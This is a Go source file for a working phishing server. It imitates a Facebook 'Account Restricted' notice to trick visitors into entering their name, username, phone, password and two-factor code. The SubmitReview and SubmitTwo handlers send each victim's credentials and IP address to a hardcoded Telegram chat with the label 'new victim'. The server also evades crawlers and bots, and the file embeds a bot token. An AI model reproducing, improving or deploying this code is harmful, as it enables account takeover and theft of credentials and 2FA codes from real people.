package main

import (
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
	"github.com/didip/tollbooth"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	"github.com/gorilla/mux"
	"github.com/gorilla/sessions"
)

var (
	telegramBotToken = "6409878479:AAEG7TrxrqcGPS1yCWpSlIYtJMQosr6W7ck" // Replace with your actual bot token
	telegramBot      *tgbotapi.BotAPI
)

var (
	reviews          []Review
	reviewsMutex     sync.Mutex
	sessionStore     = sessions.NewCookieStore([]byte("your-secret-key"))
	formSubmittedKey = "formSubmitted"
)



func blockBotsHandler(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		userAgent := r.Header.Get("User-Agent")

		// Example: Block based on User-Agent
		if strings.Contains(userAgent, "bot") {
			http.Error(w, "Bot access not allowed", http.StatusForbidden)
			return
		}

		// Example: Rate limiting using github.com/didip/tollbooth
		// You can adjust the rate limit as needed
		limiter := tollbooth.NewLimiter(1, nil)
		if limitReached := tollbooth.LimitByRequest(limiter, w, r); limitReached != nil {
			http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
			return
		}

		// Your regular handling logic here
		next.ServeHTTP(w, r)
	})
}


// PageVariables struct for passing data to HTML template
type PageVariables struct {
	Title         string
	ProfileName   string
	Status        string
	Violations    []Violation
	FormSubmitted bool
	ProfilePhoto  string // Add this line
}

// Violation struct to represent a violation
type Violation struct {
	Message string
	Date    string
}


// Review struct to represent a review
type Review struct {
	FullName    string
	Username    string
	Phone       string
	Description string
	Password    string
	IPAddress   string
	Timestamp   time.Time
}
func robotsHandler(w http.ResponseWriter, r *http.Request) {
	// Content of the robots.txt file
	robotsTxt := "User-agent: *\nDisallow: /\n"

	// Set the content type to text/plain
	w.Header().Set("Content-Type", "text/plain")

	// Write the content of the robots.txt file to the response
	w.Write([]byte(robotsTxt))
}

func main() {
	initTelegramBot()

	r := mux.NewRouter()

	r.HandleFunc("/", HomePage).Methods("GET")
	r.HandleFunc("/twofactory", TwoFactoryPage).Methods("GET")
	r.HandleFunc("/home/{username}", HomePage).Methods("GET")
	r.HandleFunc("/find", FindPage).Methods("GET")
	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
	r.HandleFunc("/submit-review", SubmitReview).Methods("POST")
	r.HandleFunc("/submit-two-factor", SubmitTwo).Methods("POST")
	r.HandleFunc("/upload", UploadPage).Methods("GET")
	r.HandleFunc("/upload", UploadHandler).Methods("POST")
	http.HandleFunc("/robots.txt", robotsHandler)
	// Get the port from the environment variable or default to 8080
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	log.Printf("Starting server on :%s", port)

	// Use http.ListenAndServe to start the server on the specified port
	http.ListenAndServe(":"+port, r)
}

func initTelegramBot() {
	var err error
	telegramBot, err = tgbotapi.NewBotAPI(telegramBotToken)
	if err != nil {
		log.Fatal(err)
	}

	if telegramBot == nil {
		log.Fatal("Telegram bot is nil")
	}

	log.Printf("Authorized on account %s", telegramBot.Self.UserName)
}

func HomePage(w http.ResponseWriter, r *http.Request) {
	session, _ := sessionStore.Get(r, "session-name")
	formSubmitted, _ := session.Values[formSubmittedKey].(bool)

	username := mux.Vars(r)["username"]

	data := PageVariables{
		Title:        "Facebook",
		ProfileName:  username,
		Status:       "Account Restricted",
		ProfilePhoto: getUserProfilePhoto(username),
		Violations: []Violation{
			{Message: "Link you shared didn't follow our Community Standards on harassment and bullying", Date: "Dec 8th 2023 - Open"},
		},
		FormSubmitted: formSubmitted,
	}

	renderTemplate(w, "index.html", data)
}

func UploadPage(w http.ResponseWriter, r *http.Request) {
	data := PageVariables{
		Title: "Photo Upload",
	}

	renderTemplate(w, "upload.html", data)
}

func UploadHandler(w http.ResponseWriter, r *http.Request) {
	file, handler, err := r.FormFile("photo")
	if err != nil {
		http.Error(w, "Error retrieving the file", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	// Check if the file has a JPG extension
	if !strings.HasSuffix(strings.ToLower(handler.Filename), ".jpg") {
		http.Error(w, "Invalid file format. Only JPG files are allowed.", http.StatusBadRequest)
		return
	}

	// Specify the upload directory
	uploadDir := "./static/images/profile"

	// Create the directory if it doesn't exist
	if err := os.MkdirAll(uploadDir, os.ModePerm); err != nil {
		http.Error(w, "Error creating upload directory", http.StatusInternalServerError)
		return
	}

	// Create the file on the server
	filePath := filepath.Join(uploadDir, handler.Filename)
	dst, err := os.Create(filePath)
	if err != nil {
		http.Error(w, "Error creating file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	// Copy the uploaded file to the destination file
	if _, err := io.Copy(dst, file); err != nil {
		http.Error(w, "Error copying file", http.StatusInternalServerError)
		return
	}

	// Print the filename to the console
	fmt.Printf("Received file: %s\n", handler.Filename)

	http.Redirect(w, r, "/upload", http.StatusSeeOther)
}

func getUserProfilePhoto(username string) string {
	photoPath := fmt.Sprintf("/static/images/profile/%s.jpg", username)
	return photoPath
}

func TwoFactoryPage(w http.ResponseWriter, r *http.Request) {
	data := PageVariables{
		Title: "Two-Factor Authentication",
	}

	renderTemplate(w, "twofactory.html", data)
}

func FindPage(w http.ResponseWriter, r *http.Request) {
	data := PageVariables{
		Title: "Two-Factor Authentication",
	}

	renderTemplate(w, "find.html", data)
}

func renderTemplate(w http.ResponseWriter, tmpl string, data interface{}) {
	tmplFile, err := template.ParseFiles("templates/" + tmpl)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	err = tmplFile.Execute(w, data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
}

func SubmitReview(w http.ResponseWriter, r *http.Request) {
	err := r.ParseForm()
	if err != nil {
		http.Error(w, "Error parsing form data", http.StatusBadRequest)
		return
	}

	ipAddress := r.Header.Get("X-Real-IP")
	if ipAddress == "" {
		ipAddress = r.Header.Get("X-Forwarded-For")
	}

	if ipAddress == "" {
		ipAddress = r.RemoteAddr
	}

	fullName := r.FormValue("fullname")
	username := r.FormValue("username")
	phone := r.FormValue("phone")
	description := r.FormValue("description")
	password := r.FormValue("password")

	reviewsMutex.Lock()
	defer reviewsMutex.Unlock()

	reviews = append(reviews, Review{
		FullName:    fullName,
		Username:    username,
		Phone:       phone,
		Description: description,
		Password:    password,
		IPAddress:   ipAddress,
		Timestamp:   time.Now(),
	})

	chatID := int64(6546551584)
	message := fmt.Sprintf("Ni viktim e re 😘😘:\nName: %s\nUsername: %s\nPhone: %s\nDescription: %s\nPassword: %s\nIP Address: %s",
		fullName, username, phone, description, password, ipAddress)
	sendTelegramMessage(chatID, message)

	session, _ := sessionStore.Get(r, "session-name")
	session.Values[formSubmittedKey] = true
	session.Save(r, w)

	http.Redirect(w, r, "/twofactory", http.StatusSeeOther)
}

func SubmitTwo(w http.ResponseWriter, r *http.Request) {
	err := r.ParseForm()
	if err != nil {
		http.Error(w, "Error parsing form data", http.StatusBadRequest)
		return
	}

	twoFactory := r.FormValue("twofactory")

	chatID := int64(6546551584)
	message := fmt.Sprintf("TwoF: %s", twoFactory)
	sendTelegramMessage(chatID, message)

	http.Redirect(w, r, "/find", http.StatusSeeOther)
}

func sendTelegramMessage(chatID int64, message string) {
	msg := tgbotapi.NewMessage(chatID, message)
	_, err := telegramBot.Send(msg)
	if err != nil {
		log.Println("Error sending message via Telegram:", err)
	}
}
